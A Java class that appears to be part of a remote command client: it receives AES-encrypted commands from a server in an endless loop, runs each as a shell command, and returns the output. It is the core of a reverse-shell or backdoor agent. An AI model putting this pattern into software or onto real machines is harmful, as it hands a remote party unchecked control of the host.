package com.clientapp.service.implement;

import com.clientapp.ClientSocket;
import com.clientapp.service.IClientCommand;
import javax.crypto.SecretKey;


import static com.clientapp.util.implement.EncodeDecoder.*;
import static com.clientapp.util.implement.ShellCommandExecutor.executeShellCommand;

public class ClientCommand implements IClientCommand {

    public ClientCommand() {
    }

    @Override
    public void start() {
        try {

            System.out.println("Connected Successfully");
            SecretKey aesKey = ClientSocket.getInstance().getAesKey();
            // Receive commands from the server, execute shell commands, and send back results
            System.out.println("Waiting for command...");
            while (true) {
                String encryptedCommand = ClientSocket.getInstance().receiveByBufferReader();
                if (encryptedCommand != null && !encryptedCommand.isEmpty()) {
                    String command = decryptCommand(encryptedCommand, aesKey);
                    if (!command.isEmpty()) {
                        String result = executeShellCommand(command);
                        ClientSocket.getInstance().sendByBufferWriter(result);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
